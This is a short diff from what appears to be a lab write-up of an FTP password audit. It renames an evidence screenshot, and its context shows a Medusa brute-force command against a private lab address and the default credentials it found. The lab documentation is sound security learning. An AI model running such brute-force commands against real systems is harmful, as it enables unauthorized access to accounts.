@@ -29,7 +29,7 @@ medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -f -v 4
 * **Discovered Account:** `msfadmin:msfadmin`
 * **Status:** `[SUCCESS]`
 
-![FTP Audit Evidence](../images/02-medusa-ftp-attack.png)
+![FTP Audit Evidence](../images/02-medusa-ftp-bruteforce.png)
 
 ---
 
